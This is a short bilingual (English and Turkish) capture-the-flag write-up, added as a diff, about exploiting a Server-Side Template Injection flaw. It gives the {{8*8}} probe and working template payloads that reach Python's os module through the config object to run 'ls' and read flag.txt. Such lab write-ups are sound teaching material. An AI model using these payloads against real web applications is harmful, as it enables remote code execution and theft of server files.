@@ -1,0 +1,24 @@
+-- ENG --
+In this challenge, I identified a Server-Side Template Injection (SSTI) vulnerability. I first confirmed the flaw by submitting {{8*8}} as input; when the server returned 64, it proved that expressions within double curly braces were being executed on the server.
+
+To escalate this into Remote Code Execution (RCE), I accessed the Python os module through the config object's global dictionary. I executed the following payload to list the files in the directory:
+{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
+
+Once the filenames were revealed, I retrieved the flag by reading the target file:
+{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}
+
+This allowed me to read the flag directly from the server's file system.
+
+
+
+-- TR --
+
+Bu challenge'da web sitesinin kullanıcı girdilerini bir şablon motorunda işlediğini fark ettim. İlk olarak güvenlik açığını doğrulamak için {{8*8}} ifadesini gönderdim; sunucu sonucu 64 olarak döndürünce SSTI açığı kesinleşmiş oldu.
+
+Ardından, sunucunun yapılandırma nesnelerine erişerek işletim sistemi komutlarını çalıştırmak için Python'ın os kütüphanesini kullandım. Dosya listesini görmek için şu komutu enjekte ettim:
+{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
+
+Dosya isimlerini öğrendikten sonra, bayrağı okumak için cat komutunu kullandım:
+{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}
+
+Bu sayede sunucu seviyesinde erişim sağlayarak bayrağa ulaştım.
